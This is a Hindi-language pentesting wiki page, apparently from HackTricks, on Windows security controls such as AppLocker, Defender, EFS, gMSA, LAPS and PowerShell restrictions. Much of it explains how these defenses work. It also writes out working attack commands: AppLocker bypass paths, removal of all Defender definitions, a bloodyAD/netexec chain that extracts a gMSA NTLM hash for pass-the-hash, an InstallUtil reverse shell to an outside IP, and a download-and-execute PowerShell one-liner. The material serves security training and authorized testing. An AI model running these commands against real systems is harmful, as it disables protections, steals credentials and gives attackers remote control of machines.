# Windows सुरक्षा नियंत्रण

{{#include ../../banners/hacktricks-training.md}}

## AppLocker नीति

An application whitelist उन स्वीकृत software applications या executables की सूची होती है जिन्हें किसी सिस्टम पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य environment को हानिकारक malware और उन अस्वीकृत software से सुरक्षित रखना है जो किसी organization की विशिष्ट व्यावसायिक आवश्यकताओं के अनुरूप नहीं होते।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और यह system administrators को यह नियंत्रित करने की अनुमति देता है कि **कौन-से applications और files users चला सकते हैं**। यह executables, scripts, Windows installer files, DLLs, packaged apps, and packed app installers पर **सूक्ष्म नियंत्रण (granular control)** प्रदान करता है।\
संगठनों के लिए आम बात है कि वे **cmd.exe and PowerShell.exe** और कुछ निर्देशिकाओं पर write access को block कर देते हैं, **लेकिन यह सब bypass किया जा सकता है**।

### जाँच

Check which files/extensions are blacklisted/whitelisted:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
यह रजिस्ट्री पथ AppLocker द्वारा लागू की गई कॉन्फ़िगरेशन और नीतियों को रखता है, और सिस्टम पर लागू नियमों के वर्तमान सेट की समीक्षा करने का एक तरीका प्रदान करता है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy को bypass करने के लिए उपयोगी **Writable folders**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को execute करने की अनुमति दे रहा है, तो ऐसे **writable folders** हैं जिन्हें आप इसका **bypass** करने के लिए उपयोग कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- आमतौर पर **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरी AppLocker को बायपास करने में भी उपयोगी हो सकती हैं।
- **खराब लिखे गए नियमों को भी बायपास किया जा सकता है**
- उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी **`allowed` नामक फ़ोल्डर** बना सकते हैं और उसे अनुमति मिल जाएगी।
- संगठन अक्सर **blocking the `%System32%\WindowsPowerShell\v1.0\powershell.exe` executable** पर ध्यान केंद्रित करते हैं, लेकिन **other** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` के बारे में भूल जाते हैं।
- अतिरिक्त लोड और व्यापक परीक्षण की आवश्यकता के कारण **DLL enforcement very rarely enabled** होती है, इसलिए **DLLs as backdoors** AppLocker को बायपास करने में मदद करते हैं।
- आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके किसी भी प्रक्रिया में **execute Powershell** कोड चला सकते हैं और AppLocker को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## क्रेडेंशियल्स स्टोरेज

### Security Accounts Manager (SAM)

स्थानीय क्रेडेंशियल्स इस फ़ाइल में मौजूद होते हैं; पासवर्ड हैश किए गए होते हैं।

### Local Security Authority (LSA) - LSASS

Single Sign-On कारणों से **क्रेडेंशियल्स** (hashed) इस सबसिस्टम की **मेमोरी** में **सहेजे** जाते हैं।\
LSA स्थानीय **security policy** (password policy, users permissions...), **authentication**, **access tokens** आदि का प्रबंधन करती है।\
LSA वही घटक होगा जो लोकल लॉगिन के लिए दिए गए क्रेडेंशियल्स को **SAM** फ़ाइल के अंदर **चेक** करेगा और डोमेन उपयोगकर्ता को प्रमाणीकृत करने के लिए **domain controller** से **बात** करेगा।

**क्रेडेंशियल्स** प्रक्रिया **LSASS** के अंदर सहेजे जाते हैं: Kerberos tickets, NT और LM hashes, आसानी से डिक्रिप्ट किए जा सकने वाले पासवर्ड।

### LSA secrets

LSA डिस्क पर कुछ क्रेडेंशियल्स सहेज सकता है:

- Active Directory के कंप्यूटर अकाउंट का पासवर्ड (unreachable domain controller).
- Windows services के खातों के पासवर्ड
- scheduled tasks के लिए पासवर्ड
- और अधिक (IIS applications का पासवर्ड...)

### NTDS.dit

यह Active Directory का डेटाबेस है। यह केवल Domain Controllers में मौजूद होता है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है जो Windows 10 और Windows 11 में तथा Windows Server के संस्करणों में उपलब्ध है। यह सामान्य pentesting टूल्स जैसे **`WinPEAS`** को **ब्लॉक** कर सकता है। हालाँकि, इन सुरक्षा उपायों को **बायपास** करने के तरीके मौजूद हैं।

### जाँच

Defender की **स्थिति** जांचने के लिए आप PS cmdlet **`Get-MpComputerStatus`** चला सकते हैं (सक्रिय है या नहीं जानने के लिए **`RealTimeProtectionEnabled`** का मान देखें):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे सूचीबद्ध करने के लिए आप यह भी चला सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS फाइलों को एन्क्रिप्शन के माध्यम से सुरक्षित करता है, और इसके लिए एक **symmetric key** जिसका नाम **File Encryption Key (FEK)** है का उपयोग करता है। यह key उपयोगकर्ता की **public key** से एन्क्रिप्ट होकर एन्क्रिप्टेड फ़ाइल के $EFS **alternative data stream** में स्टोर होता है। जब डिक्रिप्शन की आवश्यकता होती है, तो उपयोगकर्ता के डिजिटल सर्टिफिकेट की संबंधित **private key** का उपयोग $EFS stream से FEK को डिक्रिप्ट करने के लिए किया जाता है। More details can be found [here](https://en.wikipedia.org/wiki/Encrypting_File_System).

**Decryption scenarios without user initiation** में निम्न शामिल हैं:

- जब फाइलें या फ़ोल्डर किसी non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), पर मूव किए जाते हैं तो वे स्वतः डिक्रिप्ट हो जाते हैं।
- SMB/CIFS प्रोटोकॉल के ज़रिये नेटवर्क पर भेजी जाने वाली एन्क्रिप्टेड फाइलें ट्रांसमिशन से पहले डिक्रिप्ट कर दी जाती हैं।

यह एन्क्रिप्शन तरीका मालिक को एन्क्रिप्टेड फाइलों तक **transparent access** प्रदान करता है। हालांकि, केवल मालिक का पासवर्ड बदलकर और लॉगिन करके डिक्रिप्शन संभव नहीं होगा।

**Key Takeaways**:

- EFS एक symmetric FEK का उपयोग करता है, जिसे उपयोगकर्ता की public key से एन्क्रिप्ट किया जाता है।
- डिक्रिप्शन के लिए उपयोगकर्ता की private key का उपयोग FEK तक पहुँचने के लिए किया जाता है।
- कुछ परिस्थितियों में ऑटोमैटिक डिक्रिप्शन हो सकता है, जैसे FAT32 पर कॉपी करना या नेटवर्क ट्रांसमिशन।
- एन्क्रिप्टेड फाइलें मालिक के लिए बिना अतिरिक्त कदम के एक्सेसेबल रहती हैं।

### Check EFS info

जांचें कि किसी **user** ने इस **service** का उपयोग किया है या नहीं, यह देखने के लिए चेक करें कि यह path मौजूद है:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

यह देखना कि फ़ाइल तक **कौन** की **access** है, `cipher /c \<file\>` का उपयोग करें\
आप `cipher /e` और `cipher /d` को किसी फ़ोल्डर के अंदर उपयोग करके सभी फाइलों को **encrypt** और **decrypt** भी कर सकते हैं

### Decrypting EFS files

#### Being Authority System

इस तरीके के लिए आवश्यक है कि **victim user** होस्ट के अंदर कोई **process** **running** कर रहा हो। अगर ऐसा है, तो `meterpreter` sessions का उपयोग करके आप उस यूज़र के प्रोसेस के टोकन को impersonate कर सकते हैं (`impersonate_token` from `incognito`)। या आप सीधे उस यूज़र के process में `migrate` भी कर सकते हैं।

#### Knowing the users password


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft ने IT इंफ्रास्ट्रक्चर में service accounts के प्रबंधन को आसान बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। पारंपरिक service accounts के विपरीत जिनमें अक्सर "**Password never expire**" सेटिंग सक्षम होती है, gMSA एक अधिक सुरक्षित और प्रबंधनीय समाधान प्रदान करते हैं:

- **Automatic Password Management**: gMSA एक जटिल, 240-character password का उपयोग करते हैं जो domain या computer policy के अनुसार स्वचालित रूप से बदलता है। यह प्रक्रिया Microsoft's Key Distribution Service (KDC) द्वारा संभाली जाती है, जिससे मैन्युअल पासवर्ड अपडेट की आवश्यकता खत्म हो जाती है।
- **Enhanced Security**: ये खाते lockouts के प्रति इम्यून होते हैं और interactive logins के लिए उपयोग नहीं किए जा सकते, जिससे उनकी सुरक्षा बढ़ती है।
- **Multiple Host Support**: gMSA कई होस्टों के बीच साझा किए जा सकते हैं, जिससे ये उन सेवाओं के लिए आदर्श हैं जो कई सर्वरों पर चलती हैं।
- **Scheduled Task Capability**: managed service accounts के विपरीत, gMSA scheduled tasks चलाने का समर्थन करते हैं।
- **Simplified SPN Management**: जब कंप्यूटर के sAMaccount विवरण या DNS नाम में परिवर्तन होता है तो सिस्टम स्वचालित रूप से Service Principal Name (SPN) को अपडेट करता है, जिससे SPN प्रबंधन सरल हो जाता है।

gMSA के पासवर्ड LDAP प्रॉपर्टी _**msDS-ManagedPassword**_ में स्टोर होते हैं और इन्हें Domain Controllers (DCs) द्वारा हर 30 दिनों में ऑटोमैटिक रीसेट किया जाता है। यह पासवर्ड, एक एन्क्रिप्टेड डेटा ब्लॉब जिसे [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) कहा जाता है, केवल अधिकृत administrators और जिन सर्वरों पर gMSA इंस्टॉल हैं उन सर्वरों द्वारा ही प्राप्त किया जा सकता है, जिससे एक सुरक्षित वातावरण सुनिश्चित होता है। इस जानकारी तक पहुँचने के लिए एक सुरक्षित कनेक्शन जैसे LDAPS आवश्यक है, या कनेक्शन को 'Sealing & Secure' के साथ authenticated होना चाहिए।

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

You can read this password with [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**
```
/GMSAPasswordReader --AccountName jkohler
```
[**Find more info in this post**](https://cube0x0.github.io/Relaying-for-gMSA/)

Also, check this [web page](https://cube0x0.github.io/Relaying-for-gMSA/) about how to perform a **NTLM relay attack** to **read** the **password** of **gMSA**.

### ACL chaining का दुरुपयोग कर के gMSA managed password पढ़ना (GenericAll -> ReadGMSAPassword)

कई वातावरणों में, कम-privileged उपयोगकर्ता misconfigured object ACLs का दुरुपयोग करके बिना DC compromise किये gMSA secrets तक पहुँच (pivot) कर सकते हैं:

- ऐसी group जिसे आप नियंत्रित कर सकते हैं (उदा., GenericAll/GenericWrite के माध्यम से) को gMSA पर `ReadGMSAPassword` दिया गया होता है।
- उस group में खुद को जोड़कर, आप LDAP के माध्यम से gMSA के `msDS-ManagedPassword` blob को पढ़ने का अधिकार प्राप्त कर लेते हैं और उपयोगी NTLM credentials निकाल सकते हैं।

सामान्य workflow:

1) BloodHound से path खोजें और अपने foothold principals को Owned के रूप में मार्क करें। ऐसे edges देखें:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) उस intermediate group में खुद को जोड़ें जिसे आप नियंत्रित करते हैं (उदाहरण bloodyAD के साथ):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP के माध्यम से gMSA managed password पढ़ें और NTLM hash निकालें। NetExec `msDS-ManagedPassword` के extraction और NTLM में conversion को automate करता है:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) gMSA के रूप में NTLM hash का उपयोग करके Authenticate करें (किसी plaintext की आवश्यकता नहीं है)। यदि खाता Remote Management Users में है, तो WinRM सीधे काम करेगा:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
नोट:
- `msDS-ManagedPassword` के LDAP पढ़ने के लिए sealing की आवश्यकता होती है (उदा., LDAPS/sign+seal)। Tools इसे स्वचालित रूप से संभालते हैं।
- gMSAs को अक्सर WinRM जैसे स्थानीय अधिकार दिए जाते हैं; lateral movement की योजना बनाने के लिए group membership (उदा., Remote Management Users) की पुष्टि करें।
- यदि आपको केवल blob की आवश्यकता है ताकि आप स्वयं NTLM निकाल सकें, तो MSDS-MANAGEDPASSWORD_BLOB structure देखें।


## LAPS

The **Local Administrator Password Solution (LAPS)**, available for download from [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899), स्थानीय Administrator पासवर्ड के प्रबंधन को सक्षम करता है। ये पासवर्ड, जो **यादृच्छिक**, अद्वितीय, और **नियमित रूप से बदले जाते हैं**, Active Directory में केंद्रीकृत रूप से संग्रहित होते हैं। इन पासवर्ड्स तक पहुँच ACLs के माध्यम से अधिकृत उपयोगकर्ताओं तक सीमित है। पर्याप्त अनुमतियाँ मिलने पर, स्थानीय admin पासवर्ड पढ़ने की क्षमता प्राप्त हो सकती है।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell को प्रभावी ढंग से उपयोग करने के लिए आवश्यक कई सुविधाओं को **प्रतिबंधित कर देता है**, जैसे कि COM objects को ब्लॉक करना, केवल अनुमोदित .NET types को अनुमति देना, XAML-based workflows, PowerShell classes, और अधिक।

### **जाँचें**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
वर्तमान Windows में वह Bypass काम नहीं करेगा लेकिन आप[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**इसे कम्पाइल करने के लिए आपको आवश्यकता पड़ सकती है** **कि** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> जोड़ें `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` और **परियोजना को .Net4.5 में बदलें**।

#### प्रत्यक्ष bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी प्रक्रिया में **Powershell कोड निष्पादित करने के लिए** कर सकते हैं और constrained mode को बायपास कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).

## PS निष्पादन नीति

डिफ़ॉल्ट रूप से यह **restricted.** पर सेट होता है। इस नीति को बायपास करने के मुख्य तरीके:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)

## Security Support Provider Interface (SSPI)

यह API है जिसे उपयोगकर्ताओं को प्रमाणित करने के लिए उपयोग किया जा सकता है।

SSPI दो मशीनों के बीच संचार के लिए उपयुक्त प्रोटोकॉल खोजने के लिए जिम्मेदार होता है। इसकी पसंदीदा विधि Kerberos है। फिर SSPI यह नेगोशिएट करेगा कि कौन सा प्रमाणन प्रोटोकॉल उपयोग किया जाएगा; इन प्रमाणन प्रोटोकॉल्स को Security Support Provider (SSP) कहा जाता है, ये हर Windows मशीन में DLL के रूप में मौजूद होते हैं और दोनों मशीनों के एक ही SSP का समर्थन करने पर ही वे संवाद कर सकते हैं।

### Main SSPs

- **Kerberos**: पसंदीदा
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** and **NTLMv2**: संगतता कारणों से
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers और LDAP के लिए, पासवर्ड MD5 hash के रूप में
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: इसका उपयोग उपयोग होने वाले प्रोटोकॉल (Kerberos या NTLM — जहाँ Kerberos डिफ़ॉल्ट है) को नेगोशिएट करने के लिए किया जाता है।
- %windir%\Windows\System32\lsasrv.dll

#### The negotiation could offer several methods or only one.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक फीचर है जो उच्च-प्राधिकार वाली गतिविधियों के लिए **सहमति प्रॉम्प्ट** सक्षम करता है।


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)

{{#include ../../banners/hacktricks-training.md}}
